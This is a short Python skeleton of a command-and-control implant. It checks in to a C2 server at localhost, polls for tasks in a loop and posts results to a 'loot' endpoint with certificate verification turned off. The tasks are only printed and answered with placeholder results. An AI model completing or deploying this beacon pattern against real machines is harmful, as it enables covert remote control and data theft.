import requests
import time
import uuid

IMPLANT_ID = str(uuid.uuid4())
C2 = "https://localhost"

def checkin():
    requests.post(f"{C2}/checkin", json={"uuid": IMPLANT_ID}, verify=False)

def get_tasks():
    r = requests.get(f"{C2}/tasks", params={"uuid": IMPLANT_ID}, verify=False)
    return r.json().get("tasks", [])

def send_loot(result):
    requests.post(f"{C2}/loot", json={"uuid": IMPLANT_ID, "loot": result}, verify=False)

if __name__ == "__main__":
    checkin()
    while True:
        tasks = get_tasks()
        for task in tasks:
            print(f"Executing: {task}")
            result = f"Result of '{task}'"
            send_loot(result)
        time.sleep(30)
